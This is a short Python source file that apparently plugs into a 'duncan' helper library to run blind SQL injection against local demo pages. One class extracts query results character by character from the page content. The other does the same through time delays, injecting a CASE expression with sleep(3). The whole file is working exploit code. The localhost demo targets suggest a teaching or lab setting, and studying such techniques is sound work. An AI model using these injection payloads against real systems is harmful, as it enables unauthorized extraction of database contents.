import duncan
import requests

class SimpleDuncan(duncan.Duncan):
	def decide(self,guess):

		url="http://localhost/demo/sqli/blind.php?p=1 and ord(substr((%s),%d,1))<%d" % (self._query,self._pos,guess)
		self.debug(6,url)
		r=requests.get(url)
		
		if r.content.find(':)')>-1:
			return True
		else:
			return False

class SimpleTimeBasedDuncan(duncan.DuncanTime):
	def decide(self,guess):
		import time
		t0=time.time()
		url="http://localhost/demo/sqli/time.php?p=1 and case when ord(substr((%s),%d,1))<%d then sleep(3) else 1 end" % (self._query,self._pos,guess)
		self.debug(6,url)
		r=requests.get(url)
		t1=time.time()
		self.debug(4, "Guess: %d, Time: %f" % (guess,t1-t0))
		if t1-t0>2:
			return True
		else:
			return False